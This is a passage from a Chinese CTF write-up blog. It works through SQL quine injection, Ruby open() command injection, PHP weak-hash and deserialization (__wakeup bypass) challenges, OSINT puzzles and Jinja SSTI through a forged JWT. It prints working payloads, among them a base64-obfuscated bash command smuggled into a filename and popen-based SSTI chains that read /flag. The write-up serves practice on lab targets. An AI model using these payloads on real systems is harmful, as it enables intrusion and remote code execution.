<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;union/**/select/**/(select/**/group_concat(password)/**/from/**/users/**/where/**/password/**/like/**/&#x27;</span><span class="operator">%</span>a<span class="operator">%</span><span class="string">&#x27;)&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>再次尝试才发现不能用联合查询注入，因为无论有没有都会返回null，应该直接在后面接<code>or</code>加模糊匹配</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or/**/password/**/like/**/&#x27;</span><span class="operator">%</span>e<span class="operator">%</span></span><br></pre></td></tr></table></figure>
<p>感觉这样能爆出来，但不行，并且直接打：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;or/**/username/**/like/**/&#x27;</span>admi<span class="operator">%</span>n</span><br></pre></td></tr></table></figure>
<p>都显示<code>something wrong</code>，意味着<code>username = &#39;admin&#39;</code>这个字段都没东西，这下是真想不到了，只能等个wp了</p>
<p>看完wp了：<br>理解匹配方式的时候就想过，但只想到联合查询注入可以控制得到的值，主要是真没想到怎么把前面的部分给加上去，sql语法了解的太少了…</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union/**/select/**/replace(replace(&#x27;</span>&quot;union/**/select/**/replace(replace(&quot;?&quot;,char(34),char(39)),char(63),&quot;?&quot;)/**/as/**/a#&#x27;,char(34),char(39)),char(63),&#x27;&quot;<span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;?&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">63</span>),&quot;?&quot;)<span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a#<span class="string">&#x27;)/**/as/**/a#</span></span><br></pre></td></tr></table></figure>

<p>使用union可以进行联合查询，也就是执行前面一个查询的同时进行第二个查询，即使第一个查询返回为空，如果第二个查询返回了结果，也会在之前那个表的字段之下输出查询结果，如果查询的对象仅仅是字符串，则会输出字符串</p>
<p>那么要得到自己构造的字符串，首先要保证前一个查询结果为空，表本就是空的，因此进行下一步</p>
<p>需要构造的字符串要与自己输入的字符串一样，需要使用替换的方法，将需要的内容替换进去</p>
<p>首先是replace函数，该函数有三个参数，第一个参数为原始字符串，第二个参数为需要被替换的部分，第三参数是作为替换内容的字符串</p>
<p>先研究别人的payload构造的字符串怎么变的，因为实在是看的有点晕</p>
<p>原始字符串:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&quot;union/**/select/**/replace(replace(&quot;?&quot;,char(34),char(39)),char(63),&quot;?&quot;)/**/as/**/a#&#x27;</span></span><br></pre></td></tr></table></figure>
<p>使用replace:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(<span class="string">&#x27;&quot;union/**/select/**/replace(replace(&quot;?&quot;,char(34),char(39)),char(63),&quot;?&quot;)/**/as/**/a#&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>))</span><br></pre></td></tr></table></figure>
<p>char(34)和char(39)分别是双引号和单引号，这里是将字符串中双引号替换为单引号，因为字符串直接使用单引号会导致闭合出错导致语句无法执行</p>
<p>再次使用replace：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replace(replace(<span class="string">&#x27;&quot;union/**/select/**/replace(replace(&quot;?&quot;,char(34),char(39)),char(63),&quot;?&quot;)/**/as/**/a#&#x27;</span>,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">63</span>),<span class="string">&#x27;&quot;union/**/select/**/replace(replace(&quot;?&quot;,char(34),char(39)),char(63),&quot;?&quot;)/**/as/**/a#&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>这里就是最终的替换内容了，将两处问号替换成了它原始字符串本身，这样一来，我们输入的内容与联合查询的内容就是一样的了，都是</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;union/**/select/**/replace(replace(&#x27;</span>&quot;union/**/select/**/replace(replace(&quot;?&quot;,char(34),char(39)),char(63),&quot;?&quot;)/**/as/**/a#&#x27;,char(34),char(39)),char(63),&#x27;&quot;<span class="keyword">union</span><span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>replace(replace(&quot;?&quot;,<span class="type">char</span>(<span class="number">34</span>),<span class="type">char</span>(<span class="number">39</span>)),<span class="type">char</span>(<span class="number">63</span>),&quot;?&quot;)<span class="comment">/**/</span><span class="keyword">as</span><span class="comment">/**/</span>a#<span class="string">&#x27;)/**/as/**/a#</span></span><br></pre></td></tr></table></figure>
<p>也就是说把进行执行的sql语句都作为替换用的的字符串，构造一个与输入的sql语句格式相同的字符串，并为即将替换入的sql语句准备好分身，在返回结果之前将假身替换成真身，这样就能使得输入的sql语句也成功具现化，也可以说给造出的身体注入了灵魂，这样应该比较好理解了</p>
<h2 id="png图片转换器"><a href="#png图片转换器" class="headerlink" title="png图片转换器"></a>png图片转换器</h2><p>比赛的时候没看这题，也不知道这个语言0.0</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;sinatra&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;digest&#x27;</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;base64&#x27;</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/index.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/upload.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/upload&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">unless</span> params[<span class="symbol">:file</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>] &amp;&amp; params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>].split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] == <span class="string">&#x27;png&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">    open(filename, <span class="string">&#x27;wb&#x27;</span>) &#123; <span class="params">|f|</span></span><br><span class="line">      f.write open(params[<span class="symbol">:file</span>][<span class="symbol">:tempfile</span>],<span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="string">&quot;Upload success, file stored at <span class="subst">#&#123;filename&#125;</span>&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">get <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  open(<span class="string">&quot;./view/convert.html&quot;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">post <span class="string">&#x27;/convert&#x27;</span> <span class="keyword">do</span></span><br><span class="line">  <span class="keyword">begin</span></span><br><span class="line">    <span class="keyword">unless</span> params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">    file = params[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">unless</span> file.index(<span class="string">&#x27;..&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file.index(<span class="string">&#x27;/&#x27;</span>) == <span class="literal">nil</span> &amp;&amp; file =~ <span class="regexp">/^(.+)\.png$/</span></span><br><span class="line">      <span class="keyword">return</span> <span class="string">&quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    res = open(file, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    headers <span class="string">&#x27;Content-Type&#x27;</span> =&gt; <span class="string">&quot;text/html; charset=utf-8&quot;</span></span><br><span class="line">    <span class="string">&quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot;</span> + Base64.encode64(res).gsub(<span class="regexp">/\s*/</span>, <span class="string">&#x27;&#x27;</span>) + <span class="string">&quot;\&quot;;\n&quot;</span></span><br><span class="line">  <span class="keyword">rescue</span></span><br><span class="line">    <span class="string">&#x27;something wrong&#x27;</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>考察的ruby里的open函数可以进行rce的知识点:<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmhlcm9rdS5jb20vaWRlbnRpZnlpbmctcnVieS1mdHAtY3Zl">https://blog.heroku.com/identifying-ruby-ftp-cve</span></p>
<p>关键代码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[<span class="symbol">:file</span>][<span class="symbol">:filename</span>]) + <span class="string">&#x27;.png&#x27;</span></span><br><span class="line">open(filename, <span class="string">&#x27;wb&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>filename可控，进行写入shell：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ls /</span><br><span class="line">file=|bash -c &quot;$(echo &#x27;bHMgLw==&#x27; | base64 -d)&quot; #.png</span><br><span class="line"></span><br><span class="line">cat /FLA9_KywXAv78LbopbpBDuWsm</span><br><span class="line">file=|bash -c &quot;$(echo &#x27;Y2F0IC9GTEE5X0t5d1hBdjc4TGJvcGJwQkR1V3Nt&#x27; | base64 -d)&quot; #.png</span><br></pre></td></tr></table></figure>

<h1 id="ctfshow月饼杯"><a href="#ctfshow月饼杯" class="headerlink" title="ctfshow月饼杯"></a>ctfshow月饼杯</h1><h2 id="web-1"><a href="#web-1" class="headerlink" title="web"></a>web</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>核心点</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hash</span>(<span class="string">&quot;md5&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;YBB&quot;</span>]) == <span class="variable">$_GET</span>[<span class="string">&quot;YBB&quot;</span>])</span><br></pre></td></tr></table></figure>
<p>传入值的hash值与自身弱类型相等：<code>0e215962017</code>的hash值为：<code>0e291242476940776845150308577824</code>，绕过</p>
<h2 id="osint"><a href="#osint" class="headerlink" title="osint"></a>osint</h2><h3 id="幸福小镇"><a href="#幸福小镇" class="headerlink" title="幸福小镇"></a>幸福小镇</h3><p>打开是幸福小镇的一张图，把可米给打码了，题目要求是角色名加cv名，<del>震惊1202年了还有人带幸福小镇玩</del>，因为这作品巨好看，所以我很清楚角色名，cv倒真不知道，百度一下，题目给的图居然就是百度百科头图，签到题无疑了：</p>
<p>ctfshow{可米_杨鸥}</p>
<h3 id="以卵击石"><a href="#以卵击石" class="headerlink" title="以卵击石"></a>以卵击石</h3><p>格式为ctfshow{该甜点的售价_内层馅料的种数_复刻UP主第一次提到此甜点的B站视频号}，如ctfshow{250_10_BV1aX4y1F72w}</p>
<p>先搜索了半天这个以卵击石，一无所获，直接百度搜图，找到，但大多都没有说甜品名字，找了半天，找到一篇文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuc29odS5jb20vYS8yOTM0MjM4NzBfNDA5MjU2P19mPWluZGV4X2NoYW4yOG5ld3NfMTM2">链接</span></p>
<p>在：推荐餐厅：Mr &amp; Mrs Bund</p>
<p>一栏下看到了该图，并且看到了<code>Lemon &amp; Lemon</code>的字样，一下意识到这是个柠檬，但上b站搜了半天柠檬和Lemon，都没有看到一样的图片，最终我选择去搜索餐厅名，搜到：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMTFXNDExYzd6dw==">【外滩18号】Mr &amp; Mrs Bund 法国菜，上海有名喂狗粮地方</span>，封面正是该甜品，但视频中并未介绍该甜品，我退回去，再次尝试搜索柠檬，突然看见一个封面是一个人拿着手电筒在照柠檬，也就是<code>@绵羊料理</code>，我意识到这是线索，<del>这不就是前两天学长们看的视频吗。。。</del> 果然我得到了该甜点的信息，价格110，内有6种馅，但我打出bv号却错了，我在up的视频翻了半天也没找到能扯上关系的视频，然后我（<del>去吃了个饭，回来总结了一些知识点，完了尝试继续玩这个题</del>）晚上再看的时候注意到了她在视频中引用他人的话评价这个甜品的时候，出现了两个人<code>@力元君</code>和<code>@雨哥到处跑</code>，并且这两人桌上就是这个甜品，我正打算搜索这两个up主，发现他们就在评论区，我点开他们的主页，直接查看和<code>@绵羊料理</code>同时段的视频，果然找到一个视频，两人去她家蹭饭，加上这俩人说他们几个都在上海，那个餐厅也在上海，再加上评论区说她请了两个傻子吃饭，答案呼之欲出，我看了半天 <del>太好笑舍不得跳，还没忍住笑出了声。。。</del>，终于他们的餐桌上出现了这个甜品，！！！</p>
<p>打flag：</p>
<p>ctfshow{110_6_BV1664y1W7zS}</p>
<h3 id="我的木头啊"><a href="#我的木头啊" class="headerlink" title="我的木头啊"></a>我的木头啊</h3><p>c6_I_@t216MG_0q_Uf673JTYYzBXs{31QJmTTg&#x3D;hw63XZFZiHho5GzE}</p>
<p>w形栅栏解密</p>
<p>ctfshow{626173653136_MJQXGZJTGI_YmFzZTY0_qzTiEHgB_@UX&#x3D;h}</p>
<p>分别按对应的方式解密</p>
<p>ctfshow{base16_base32_base64_base58_base}</p>
<h1 id="2021天翼杯"><a href="#2021天翼杯" class="headerlink" title="2021天翼杯"></a>2021天翼杯</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>,<span class="variable">$args</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;code);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;code = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/&quot;[BA]&quot;:(.*?):/s&#x27;</span>,<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>],<span class="variable">$ret</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$ret</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$ret</span>[<span class="number">1</span>] <span class="keyword">as</span> <span class="variable">$i</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$i</span>)!==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&quot;you want to bypass wakeup ? no !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;poc&#x27;</span>]);    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>正则匹配<code>&quot;B&quot;:</code>和<code>:</code>之间的东西，非贪婪，也就是<code>&quot;B&quot;:1:</code>就会被匹配到，并传入数组preg_match_all第三个参数<code>$ret</code>，<code>$ret</code>是一个数组，数组中有两个数组，第一数组存放匹配到的整个字符串，第二个数组存<code>(.*?)</code>匹配到的内容</p>
<p>首先造了一个直接进行命令执行的poc，但魔术方法<code>__wakeup</code>会在反序列化的同时将变量<code>$code</code>置空，需要绕过<code>__wakeup</code></p>
<p>然后找了一篇文章：<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vTXJzbTF0aC9wLzY4MzU1OTIuaHRtbA==">链接</span></p>
<p>只要主类中显示的属性数量大于真实存在的数量，即可绕过</p>
<p>但如果直接在原本的序列化字符串上修改就会导致正则匹配出现<code>(!==1)</code>的结果，所以，不把B作为主类，而是在外面再套一个自己创的类，再进行<code>__wakeup</code>的绕过：</p>
<p>poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">i</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$z</span>=<span class="keyword">new</span> i;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> B;</span><br><span class="line"></span><br><span class="line"><span class="variable">$z</span>-&gt;k=<span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a=<span class="keyword">new</span> A;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;a-&gt;code=<span class="string">&quot;phpinfo();&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$z</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><code>O:1:&quot;i&quot;:1:&#123;s:1:&quot;k&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;</code></p>
<p>然后修改：</p>
<p><code>O:1:&quot;i&quot;:2:&#123;s:1:&quot;k&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;A&quot;:1:&#123;s:4:&quot;code&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125;&#125;</code></p>
<p>即可得到phpinfo界面，搜索一下界面，可以看到ban了system函数，但scandir函数和var_dump函数都可以使用，尝试得到根目录，但被禁止了，有basedir</p>
<p>把<code>.config.php.swp</code>恢复：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_HOST&quot;</span>,<span class="string">&quot;localhost&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_USERNAME&quot;</span>,<span class="string">&quot;root&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_PASSWOrd&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;DB_DATABASE&quot;</span>,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;REDIS_PASS&quot;</span>,<span class="string">&quot;you_cannot_guess_it&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>查到是redis，没接触过，又查了一些恶意加载<code>.so</code>文件的方法，没整明白</p>
<p>看了wp，要用到蚁剑的插件，但我蚁剑的插件市场不知道为什么一直加载不出0.0</p>
<h1 id="长安杯"><a href="#长安杯" class="headerlink" title="长安杯"></a>长安杯</h1><h2 id="espy"><a href="#espy" class="headerlink" title="espy"></a>espy</h2><p>登录，抓包</p>
<p>工具解密jwt:</p>
<p>密钥：CTf4r</p>
<p>使用模板注入</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; <span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>].__subclasses__() &#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查出popen函数</span></span><br><span class="line"></span><br><span class="line">&#123;&#123;self.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">106</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>


<p>执行命令失败了，真不会了</p>
<p>复现：<br>shell改成：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;self.__class__.__mro__[<span class="number">1</span>].__subclasses__()[<span class="number">106</span>](request.cookies.s,shell=<span class="literal">True</span>,stdout=-<span class="number">1</span>).communicate()[<span class="number">0</span>]&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>因为直接执行会500</p>
<p>抓包，修改cookie:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie:token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1aWQiOiJkZjRhNjFhMS0wMzA3LTQ5ZTctYjdjZS04Zjg2YjA4OWIyOTkiLCJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoie3tzZWxmLl9fY2xhc3NfXy5fX21yb19fWzFdLl9fc3ViY2xhc3Nlc19fKClbMTA2XShyZXF1ZXN0LmNvb2tpZXMucyxzaGVsbD1UcnVlLHN0ZG91dD0tMSkuY29tbXVuaWNhdGUoKVswXX19IiwicGFzc3dkIjoiMTExIn0.YYk3HNEaJG0RZpBVoSj0sKJND4sRckObshfcOUJ0r1w;s=ls</span><br></pre></td></tr></table></figure>
<p>靶机开不了了呜呜呜，等等看buu能不能上了。</p>
<p>看的别的师傅的payload:<code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiP25hbWU9e3soeHxhdHRyKHJlcXVlc3QuY29va2llcy54MSl8YXR0cihyZXF1ZXN0LmNvb2tpZXMueDIpfGF0dHIocmVxdWVzdC5jb29raWVzLngzKSkocmVxdWVzdC5jb29raWVzLng0KS5ldmFsKHJlcXVlc3QuY29va2llcy54NSl9fSIsInVpZCI6IjRlN2NkNDg1LTU2YjctNDYwYS1iMzIwLTFiZWViZjdkYzJmMSIsInBhc3N3ZCI6IjEyMzQ1NiIsInJvbGUiOiJhZG1pbiJ9.yY3dIUG0_3tOMivjLg_DDKBdrH1jsqFrTG-B1FXbU2U;x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#39;os&#39;).popen(&#39;cat /flag&#39;).read()</code></p>
<h1 id="das2021-9-25"><a href="#das2021-9-25" class="headerlink" title="das2021.9.25"></a>das2021.9.25</h1><h2 id="hellounser"><a href="#hellounser" class="headerlink" title="hellounser"></a>hellounser</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span 